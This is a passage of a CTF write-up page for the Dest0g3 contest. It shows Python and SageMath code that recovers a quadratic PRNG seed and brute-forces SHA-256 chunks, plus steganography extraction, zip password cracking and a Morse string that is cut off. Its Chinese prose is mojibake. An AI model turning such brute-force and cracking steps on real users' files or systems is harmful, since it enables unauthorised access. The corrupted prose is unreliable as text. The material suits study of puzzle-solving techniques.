class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p><p>æˆ‘ä»¬æ±‚è§£è¿™ä¸ªå¤šé¡¹å¼å³å¯å¾—åˆ°å¯¹åº”çš„seedå€¼ã€‚è¿™é‡Œä½¿ç”¨çš„SageMathæ¥è®¡ç®—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">R.&lt;x&gt; = Zmod(<span class="hljs-number">18068433704538283397</span>)[]<br>f = <span class="hljs-number">956366446278</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">1061992537343</span>*x + <span class="hljs-number">636205571590</span> - <span class="hljs-number">4494800869822930172</span><br>f.roots()<br><span class="hljs-comment"># [(12358488364449364025, 1), (626844643882, 1)]</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ªå€¼ï¼Œ12358488364449364025å’Œ626844643882ã€‚</p><p>è¿™é‡Œseedè¦æ˜¯40ä½çš„æ•°æ‰è¡Œã€‚12358488364449364025æ˜¯64ä½çš„ï¼Œè€Œ626844643882æ˜¯40ä½çš„ã€‚æ‰€ä»¥æˆ‘ä»¬çš„seedæ˜¯626844643882ã€‚</p><p>å‰é¢è¿™éƒ¨åˆ†åªæ˜¯è¿™é¢˜çš„ä¸€éƒ¨åˆ†éš¾ç‚¹ã€‚å¾—åˆ°äº†seedåé¢æ€ä¹ˆè¿›è¡Œå¤„ç†è€ƒè™‘äº†åŠå¤©ã€‚è¿™åˆæ˜¯shaçš„åˆæ˜¯<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>e</mi><msup><mi>d</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">mod (seed^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> æ²¡æœ‰åŠæ³•é€†è¿‡ç¨‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br></code></pre></td></tr></table></figure><p>å½“æ—¶çœ‹åˆ°æœ‰ä¸ªtableåœ¨è¿™ä½†æ˜¯æ²¡æœ‰ç”¨åˆ°æˆ‘è¿˜æ„Ÿåˆ°å¥‡æ€ªã€‚ç°åœ¨çœ‹æ¥ï¼Œæ˜¯å«æˆ‘ä»¬æš´åŠ›ç ´è§£äº†ã€‚</p><p>å­—ç¬¦é›†åº”è¯¥å°±æ˜¯è¿™ä¸ªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">626844643882</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br>seed = <span class="hljs-number">626844643882</span><br>r = RHODES_ELITE()<br>r.<span class="hljs-built_in">next</span>()<br>r.<span class="hljs-built_in">next</span>()<br>flag = <span class="hljs-number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br>flag = long_to_bytes(flag)<br><br><span class="hljs-comment"># å…ˆç”¨å°å†™å­—æ¯è·‘ä¸€ä¸‹è¯•è¯•</span><br>table = string.ascii_lowercase + string.digits<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.permutations(table,<span class="hljs-number">4</span>):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>å¥‡æ€ªçš„æ˜¯ï¼Œæˆ‘å¥½å¤šéƒ½è·‘ä¸å‡ºæ¥ï¼Ÿ9ç»„æ•°æ®æˆ‘å°±è·‘å‡ºæ¥ä¸‰ç»„ã€‚ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ç”¨çš„æšä¸¾å¯¼è‡´çš„ã€‚åé¢æ¢æˆç¬›å¡å°”é›†ä¹Ÿæ²¡è·‘å‡ºæ¥ã€‚åé¢æ€€ç–‘æ˜¯ä¸æ˜¯å­—ç¬¦é›†å°‘äº†ä¸œè¥¿ã€‚å› ä¸ºçœ‹å…¶ä»–çš„flagä¸­é—´ä¸€èˆ¬éƒ½ä¼šæœ‰å‡ ä¸ªâ€™-â€˜æˆ–è€…â€™_â€™ï¼Œæ‰€ä»¥æˆ‘æŠŠâ€™-_'éƒ½æ·»åŠ åˆ°äº†å­—ç¬¦é›†ï¼Œç„¶åå†è·‘ã€‚å‘ç°èƒ½å¤Ÿè·‘å‡ºæ¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-_&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.product(table,table,table,table):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span><br><span class="hljs-comment"># Dest0g3&#123;d2a4d1af-8a80-8794-99ac-635f89494cac&#125;</span><br></code></pre></td></tr></table></figure><p>èŠ±çš„æ—¶é—´ä¹Ÿä¸ç®—å¤ªé•¿ï¼Œå¤§æ¦‚5åˆ†é’Ÿã€‚</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h2><p>StegoSolveçœ‹ä¸€éï¼Œå›¾åƒä¸Šæ²¡æœ‰ä»€ä¹ˆå€¼å¾—æ³¨æ„çš„åœ°æ–¹ã€‚LSBå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯†ç ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0617373776f7264</span> <span class="hljs-number">20666</span>f72207a6970  Password  for zip<br><span class="hljs-attribute">3a5765616b5f5061</span> <span class="hljs-number">733577307264</span>ffff  :Weak_Pa s5w0rd..<br></code></pre></td></tr></table></figure><p>foremoståˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…,ç”¨ä¸Šè¿°å¯†ç è¿›è¡Œè§£å‹å¾—åˆ°flagã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># Dest0g3&#123;<span class="hljs-number">2908</span>C1AA-B2C1-B<span class="hljs-number">8E6-89D1</span>-<span class="hljs-number">21</span>B<span class="hljs-number">97D778603</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h2><p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ²¡æœ‰å…¶ä»–ä¿¡æ¯äº†ã€‚å¯†ç æ‰¾äº†ä¸€åœˆæ²¡æœ‰æ‰¾åˆ°ã€‚é‡‡å–çˆ†ç ´å°è¯•ã€‚ziperelloçˆ†ç ´6ä½æ•°å­—å¯†ç å¾—åˆ°å¯†ç ä¸ºï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">100861<br></code></pre></td></tr></table></figure><p>æ‰“å¼€æ–‡æœ¬æ–‡ä»¶å¾—åˆ°æ‘©æ–¯ç”µç :</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span 